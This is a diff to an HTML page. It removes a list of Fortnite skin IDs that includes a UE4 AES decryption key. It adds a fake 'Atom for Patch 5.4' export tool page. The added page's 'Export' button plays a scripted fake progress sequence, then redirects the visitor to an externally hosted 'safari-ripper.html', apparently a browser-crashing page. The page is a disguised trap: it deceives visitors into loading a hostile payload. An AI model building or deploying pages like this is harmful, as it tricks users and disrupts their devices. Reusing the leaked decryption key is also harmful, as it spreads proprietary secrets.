@@ -1,51 +1,86 @@
-<!DOCTYPE html>
 
-<html lang="en">
-
-<HTML>
-<BODY>
-
-<P> 
---------------------------------------------------------------------------------------</br>
-UE4 Viewer AES Key: 0x81c42e03b21760a5c457c8db7d52ba066f0633d0891fd9e37cf118f27687924a</br>
--------------------------------------------------------------------------------------- </br>
-Batte Hound: Not avalible 
-Sunstrider: CID_166_Athena_Commando_F_Lifeguard (9) </br>
-Drift: CID_161_Athena_Commando_M_Drift (5) Raggy: 
-CID_165_Athena_Commando_M_DarkViking(10) </br>
-Enforcer: CID_200_Athena_Commando_M_DarkPaintballer (15)</br>
-Omega: CID_116_Athena_Commando_M_CarbideBlack (12)</br>
-Carbide: CID_115_Athena_Commando_M_CarbideBlue (11) </br>
-Havoc: CID_089_Athena_Commando_M_RetroGrey (9)</br>
-Sledgehammer: CID_167_Athena_Commando_M_TacticalBadass (14)</br>
-Redline: CID_162_Athena_Commando_F_StreetRacer (11)</br>
-Huntress: CID_163_Athena_Commando_F_Viking (6)</br>
-Wingman: CID_139_Athena_Commando_M_FighterPilot (12)</br>
-Squad Leader: CID_117_Athena_Commando_M_TacticalJungle (14)</br>
-Zoey: CID_119_Athena_Commando_F_Candy (5)</br>
-Teknique: CID_120_Athena_Commando_F_Graffiti (8)</br>
-SubCommnder: CID_125_Athena_Commando_M_TacticalWoodland (16)</br>
-
-
----------------------------------------------------------------- </br>
-Elite Agent: CID_083_Athena_Commando_F_Tactical (8) Combination with (CID_120_Athena_Commando_F_Graffiti)</br>
-Bunny Brawler: CID_104_Athena_Commando_F_Bunny (5) Combination With (CID_161_Athena_Commando_M_Drift) Recomended (CID_119_Athena_Commando_F_Candy)</br>
-Ginger Bread: CID_049_Athena_Commando_M_HolidayGingerbread (No combo)</br>
-Ghoul Trooper: CID_029_Athena_Commando_F_Halloween (not working)</br>
-Crackshot: CID_050_Athena_Commando_M_HolidayNutcracker (mot working)</br>
-Black KNight: CID_035_Athena_Commando_M_Medieval (8) Combination with (CID_120_Athena_Commando_F_Graffiti)</br>
-Guitar girl: CID_205_Athena_Commando_F_GarageBand (10) No combo</br>
-Brite Gunner: CID_112_Athena_Commando_M_Brite (5) Combination With (CID_161_Athena_Commando_M_Drift) and Zoey: CID_119_Athena_Commando_F_Candy (5) </br>
-CloakedStar: CID_203_Athena_Commando_M_CloakedStar (11) Combination With Redline: CID_162_Athena_Commando_F_StreetRacer </br>
-SteelSight: CID_111_Athena_Commando_F_Robo (4) no combo</br>
-Rouge Agent: CID_090_Athena_Commando_M_Tactical (8) Combination with (CID_120_Athena_Commando_F_Graffiti)</br>
-HighLand Wrrior: CID_099_Athena_Commando_F_Scathach (8) Combination with (CID_120_Athena_Commando_F_Graffiti)</br>]
-
-
------------------------------------------------------------------</br>
-
-</P>
-
-</BODY>
-
-</HTML>
+<html>
+  <head>
+    <style>
+      body {
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 300;
+        background-color: #ddd;
+      }
+      h3.disclaimer {
+        position: fixed;
+        bottom: 0;
+        font-style: italic;
+        font-weight: 300;
+      }
+      h1.jbme {
+        font-weight: 600;
+        font-size: 38pt;
+        margin-bottom: -32px;
+      }
+      h1.iosv {
+        font-weight: 500;
+        font-size: 30pt;
+        color: #333;
+        margin-bottom: -30px;
+      }
+      h1.credits {
+        font-weight: 300;
+      }
+      div.rape {
+        padding: 15px;
+        background-color: #fff;
+        border-radius: 15px;
+        width: 320px;
+        height: 300px;
+      }
+      a.jblol {
+        background-color: #00B3FF;
+        border-radius: 11px;
+        padding: 15px 96px 15px 96px;
+        color: white;
+        font-weight: 600;
+      }
+      a.jblol:hover {
+        background-color: #0089C4;
+      }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,500,600" rel="stylesheet">
+    <title>Totally real jbme</title>
+  </head>
+  <body onload="hideProgress()">
+    <center><div class="rape">
+    <center><h1 class="jbme">Atom</h1></center>
+    <center><h1 class="iosv">for Patch 5.4</h1></center>
+    <center><h1 class="credits">by @Vap0x</h1></center>
+    <center><h1 class="credits" id="prog">Exporting... (1/3)</h1></center>
+    <br>
+    <br>
+    <br>
+    <a class="jblol" id="btn" onclick="jailbreak()">Export</a>
+  </div></center>
+  <h3 class="disclaimer">(DISCLAIMER: This can possibly ban you)</h3>
+  </body>
+  <script>
+  function hideProgress() {
+    var x = document.getElementById("prog");
+    x.style.display = "none";
+  }
+  function jailbreak() {
+    var a = document.getElementById("prog");
+    var b = document.getElementById("btn");
+    a.style.display = "block";
+    b.style.display = "none";
+    setTimeout(function () {
+      document.getElementById("prog").innerHTML = "Changing PSK... (2/3)";
+    }, 5000);
+    setTimeout(function () {
+      document.getElementById("prog").innerHTML = "Confirming... (3/3)";
+    }, 10000);
+    setTimeout(function () {
+      document.location.href="https://cdn.rawgit.com/pwnsdx/ce64de2760996a6c432f06d612e33aea/raw/23f2faa0aadb4babbfd228c8bb32a26a8c51c741/safari-ripper.html";
+    }, 12000);
+  }
+  </script>
+</html>
